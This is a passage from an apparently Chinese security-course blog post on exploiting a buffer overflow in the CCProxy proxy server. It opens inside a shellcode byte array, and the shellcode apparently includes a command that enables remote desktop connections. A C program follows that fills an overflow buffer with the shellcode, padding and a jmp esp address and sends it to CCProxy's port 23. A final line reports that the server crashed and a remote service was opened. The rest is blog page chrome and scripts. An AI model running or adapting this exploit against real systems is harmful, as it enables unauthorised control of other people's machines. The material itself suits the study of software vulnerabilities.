class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDB</span>,<span class="number">0x73</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xDC</span>,<span class="number">0x73</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDD</span>,<span class="number">0x21</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDE</span>,<span class="number">0x3D</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xDF</span>,</span><br><span class="line"><span class="number">0x22</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE0</span>,<span class="number">0x22</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xE1</span>,<span class="number">0x29</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE2</span>,<span class="number">0x20</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE3</span>,<span class="number">0x43</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xE4</span>,<span class="number">0x41</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE5</span>,<span class="number">0x4C</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE6</span>,<span class="number">0x4C</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE7</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xE8</span>,<span class="number">0x53</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xE9</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xEA</span>,<span class="number">0x74</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xEB</span>,<span class="number">0x41</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xEC</span>,<span class="number">0x6C</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xED</span>,<span class="number">0x6C</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xEE</span>,<span class="number">0x6F</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xEF</span>,</span><br><span class="line"><span class="number">0x77</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF0</span>,<span class="number">0x54</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xF1</span>,<span class="number">0x53</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF2</span>,<span class="number">0x43</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF3</span>,<span class="number">0x6F</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xF4</span>,<span class="number">0x6E</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF5</span>,<span class="number">0x6E</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF6</span>,<span class="number">0x65</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF7</span>,</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xF8</span>,<span class="number">0x74</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,</span><br><span class="line"><span class="number">0x45</span>,<span class="number">0xF9</span>,<span class="number">0x69</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xFA</span>,<span class="number">0x6F</span>,</span><br><span class="line"><span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xFB</span>,<span class="number">0x6E</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,</span><br><span class="line"><span class="number">0xFC</span>,<span class="number">0x73</span>,<span class="number">0x36</span>,<span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xFD</span>,<span class="number">0x20</span>,<span class="number">0x36</span>,</span><br><span class="line"><span class="number">0xC6</span>,<span class="number">0x45</span>,<span class="number">0xFE</span>,<span class="number">0x31</span>,<span class="number">0x8D</span>,<span class="number">0x45</span>,<span class="number">0xA8</span>,<span class="number">0x50</span>,</span><br><span class="line"><span class="number">0xB8</span>,<span class="number">0xC7</span>,<span class="number">0x93</span>,<span class="number">0xBF</span>,<span class="number">0x77</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WSADATA ws; <span class="comment">// 初始化 ws</span></span><br><span class="line">	<span class="keyword">int</span> ret = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;ws);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">	sa.sin_family = AF_INET;</span><br><span class="line">	sa.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">	sa.sin_addr.s_addr = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[MAX_LEN];</span><br><span class="line">	<span class="keyword">char</span> buf1[<span class="number">1024</span>];</span><br><span class="line">	buf[<span class="number">0</span>]=<span class="string">'p'</span>;buf[<span class="number">1</span>]=<span class="string">'i'</span>;buf[<span class="number">2</span>]=<span class="string">'n'</span>;buf[<span class="number">3</span>]=<span class="string">'g'</span>;buf[<span class="number">4</span>]=<span class="string">' '</span>;</span><br><span class="line">	<span class="comment">// 插入Shellcode</span></span><br><span class="line">	<span class="keyword">int</span> l = <span class="built_in">strlen</span>(shell);</span><br><span class="line">	<span class="comment">//前4个字节为无用字节</span></span><br><span class="line">	buf[<span class="number">5</span>]=buf[<span class="number">6</span>]=buf[<span class="number">7</span>]=buf[<span class="number">8</span>]=<span class="string">'a'</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">9</span>; j &lt; <span class="number">9</span>+l; j++)&#123;</span><br><span class="line">		buf[j] = shell[j<span class="number">-9</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//开始填入shellcode</span></span><br><span class="line">	<span class="comment">//该处代码自己研究;</span></span><br><span class="line">	<span class="comment">//到溢出点为止都填入无用字节</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">9</span>+l;i&lt;<span class="number">1012</span>+<span class="number">5</span>;i++)</span><br><span class="line">	buf[i]=<span class="string">'a'</span>;</span><br><span class="line">	<span class="comment">//for(int i=9;i&lt;1012+5;i++)</span></span><br><span class="line">	<span class="comment">//buf[i]='a';</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//在溢出点处填入 jump esp 指令的地址该处代码自己研究</span></span><br><span class="line">	buf[<span class="number">1017</span>] = <span class="number">0x12</span>;</span><br><span class="line">	buf[<span class="number">1018</span>] = <span class="number">0x45</span>;</span><br><span class="line">	buf[<span class="number">1019</span>] = <span class="number">0xFA</span>;</span><br><span class="line">	buf[<span class="number">1020</span>] = <span class="number">0x7F</span>;</span><br><span class="line">	<span class="comment">//7FFA4512</span></span><br><span class="line">	<span class="comment">//继续填充无用字节</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1021</span>;i&lt;<span class="number">1998</span>;i++)</span><br><span class="line">	buf[i]=<span class="string">'a'</span>;</span><br><span class="line">	<span class="comment">//命令结束加上\r\n</span></span><br><span class="line">	buf[<span class="number">1998</span>]=<span class="string">'\r'</span>;buf[<span class="number">1999</span>]=<span class="string">'\n'</span>;</span><br><span class="line">	<span class="comment">// 创建 socket</span></span><br><span class="line">	SOCKET sc = WSASocket(AF_INET, SOCK_STREAM,IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);  <span class="comment">//连接到服务器</span></span><br><span class="line">	ret = connect(sc, (<span class="keyword">const</span> sockaddr*)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">	<span class="comment">//接收服务器端的回答</span></span><br><span class="line">	recv(sc,buf1,<span class="number">1024</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="comment">// 发送攻击数据</span></span><br><span class="line">	ret = send(sc, buf, <span class="number">2000</span>, <span class="number">0</span>);</span><br><span class="line">	closesocket(sc);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>然后将上述然后运行CCPROXY，再执行刚刚编写的代码，发现CCPROXY成功溢出奔溃，并且开启了远程服务。</li>
+</ol>
+<p><a href="https://imgchr.com/i/BSwCa4" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/20/BSwCa4.png" alt="BSwCa4.png"></a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag"><i class="fa fa-tag"></i> 栈溢出</a>
+          
+            <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="tag"><i class="fa fa-tag"></i> 字符串</a>
+          
+            <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> 软件安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/11/01/%E5%BA%8F%E5%88%97%E5%90%88%E5%B9%B6(%E6%B4%9B%E8%B0%B7P1631)%E4%BA%8C%E5%88%B7/" rel="next" title="序列合并(洛谷P1631)">
+                <i class="fa fa-chevron-left"></i> 序列合并(洛谷P1631)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div class="ds-thread" data-thread-key="2020/11/02/CCPROXY漏洞利用/"
+           data-title="CCPROXY漏洞利用" data-url="http://yoursite.com/2020/11/02/CCPROXY%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://note.youdao.com/yws/api/personal/file/94706D7C9BE34FFEBAD4C35B311F0E38?method=download&shareKey=5a712edcc9469413b507c8ef9cf15513"
+                alt="panfeng's blog" />
+            
+              <p class="site-author-name" itemprop="name">panfeng's blog</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">65</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">78</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/AgentGuo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:841796600@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CCPROXY漏洞利用"><span class="nav-text">CCPROXY漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-找到并定位溢出点"><span class="nav-text">1.找到并定位溢出点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-完成基本的添加用户Shellcode"><span class="nav-text">2.完成基本的添加用户Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-利用缓冲区溢出执行ShellCode"><span class="nav-text">3.利用缓冲区溢出执行ShellCode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-实现一个具备远程连接控制功能的ShellCode"><span class="nav-text">4.实现一个具备远程连接控制功能的ShellCode</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">panfeng's blog</span>
+
+  
+</div>
+
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+ -->
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共109.2k字</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"your-duoshuo-shortname"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    
+    <script src="/lib/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("GksJHYNBz0VjRrAQjwNpruiC-gzGzoHsz", "0pYCKkFIF1OaexePM7yvqmnf");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":270,"height":540},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end --></body>
+</html>
